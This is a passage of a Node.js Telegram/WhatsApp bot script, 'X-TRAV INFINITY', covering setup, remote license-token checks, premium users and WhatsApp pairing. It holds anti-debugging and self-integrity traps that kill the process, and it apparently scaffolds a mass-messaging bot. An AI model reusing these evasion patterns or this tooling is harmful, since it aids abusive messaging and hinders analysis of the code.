const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/ZyuuKnowxy/xsockers/refs/heads/main/token.json';
const thumbnailUrl = "https://ganga--link--ghhzdp9sv8hk.code.run/i/3xplbssr";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 1.0
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 1.0
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 1.0
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 1.0
 ▢ Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 1.0
 ▢ Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 1.0
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

